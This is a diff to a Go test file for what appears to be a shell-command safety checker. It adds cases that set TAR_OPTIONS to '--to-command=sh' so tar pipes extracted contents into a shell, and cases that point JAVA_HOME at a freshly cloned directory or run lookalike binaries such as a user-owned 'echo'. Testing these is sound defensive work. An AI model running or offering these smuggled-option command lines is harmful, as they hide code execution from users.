@@ -92,6 +92,7 @@ func TestRED_UnsetOrUnexportNeverLowersOptionVariable(t *testing.T) {
 	for _, cmd := range []string{
 		export + `unset TAR_OPTIONS; export TAR_OPTIONS=--to-command=sh; tar xf x.tar`,
 		`export TAR_OPTIONS=-v; export -n TAR_OPTIONS=--to-command=sh; tar xf x.tar`,
+		`export -n TAR_OPTIONS=--to-command=sh; tar xf x.tar`,
 		`export -fn TAR_OPTIONS=--to-command=sh; tar xf x.tar`,
 		export + `export -n TAR_OPTIONS; export TAR_OPTIONS; tar xf x.tar`,
 		export + `unset TAR_OPTIONS; TAR_OPTIONS=--to-command=sh tar xf x.tar`,
@@ -275,6 +276,9 @@ func TestRED_NonSystemJavaBinaryExemptOnlyInASafeCommandLine(t *testing.T) {
 		`eval 'git clone https://e.example/x ` + sdk + `'; JAVA_HOME=` + sdk + ` mvn -v`,
 		`git clone https://e.example/x ` + sdk + `; env JAVA_HOME=` + sdk + ` mvn -v`,
 		`git clone https://e.example/x ` + sdk + `; JAVA_HOME=` + sdk + ` sh mvnw -v`,
+		// A program that only shares the name of an inert command.
+		`/home/user/bin/echo x; JAVA_HOME=` + sdk + ` mvn -v`,
+		`~/bin/cat j.b64; JAVA_HOME=` + sdk + ` mvn -v`,
 		// Another reader that writes can prepare the JDK as well.
 		`JAVA_HOME=~/.sdkman/candidates/java/a jar xf j.jar; JAVA_HOME=` + sdk + ` mvn -v`,
 	} {
@@ -287,6 +291,7 @@ func TestRED_NonSystemJavaBinaryExemptOnlyInASafeCommandLine(t *testing.T) {
 		`JAVA_HOME=~/.sdkman/candidates/java/current mvn -v`,
 		`export JAVA_HOME=$HOME/.asdf/installs/java/temurin-21; mvn -v`,
 		`echo building; JAVA_HOME=~/.jenv/versions/17 mvn -v`,
+		`/bin/echo building; JAVA_HOME=~/.jenv/versions/17 mvn -v | /usr/bin/head -3`,
 		`echo building && JAVA_HOME=~/.jenv/versions/17 mvn -v && echo done`,
 		`export JAVA_HOME=~/.sdkman/candidates/java/current; mvn -v; mvn -v`,
 		`JAVACMD=~/tools/jdk/bin/java mvn -v`,
